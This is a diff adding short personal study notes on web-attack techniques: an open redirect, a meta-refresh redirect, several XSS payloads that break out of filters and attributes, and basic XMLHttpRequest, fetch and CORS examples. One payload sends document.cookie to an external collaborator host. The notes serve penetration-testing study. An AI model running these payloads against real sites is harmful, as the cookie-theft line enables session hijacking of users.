@@ -1,0 +1,38 @@
+/product?cztergoty="jjj"&path="http://googele.com" - open redirect vulnearability
+
+redirect in html injections
+<meta http-equiv="refresh" content="2;url=http://example.com" />
+
+add js to html
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<img%20src="asdasd"%20onerror="alert(1337)"> if is already in script or other filters 
+<svg/onload=alert(1337) > if is already in script or other filters 
+?jeff=%22-alert(1337)-%22 in javacript
+https://da-wey.html?wey=test%22%3E%20onfocus=%22alert(1337)%22 executes when 'wey' field is focused, add %20autofocus after wey=test
+<a href=javascript:alert(1)>link</a>
+<script>location="http://pntstr.i4nq69h2l1hdc2gczu919jf3hunlbbz0.oastify.com/?"+document.cookie</script>
+
+XmlHttpRequest
+function reqListener () {
+console.log(this.responseText); 
+}
+
+var oReq = new XMLHttpRequest();
+oReq.onload = reqListener;
+oReq.open("get", "https://opensource.adobe.com/Spry/data/json/donuts.js", true);
+oReq.send();
+
+fetch()
+fetch('https://opensource.adobe.com/Spry/data/json/donuts.js')
+.then((response) => {
+  return response.text();
+})
+.then((data) => {
+  console.log(data);
+});
+
+
+CORS 
+Access-Control-Allow-Origin - header in which we specify from what resources request are allowed
+Access-Control-Allow-Credentials
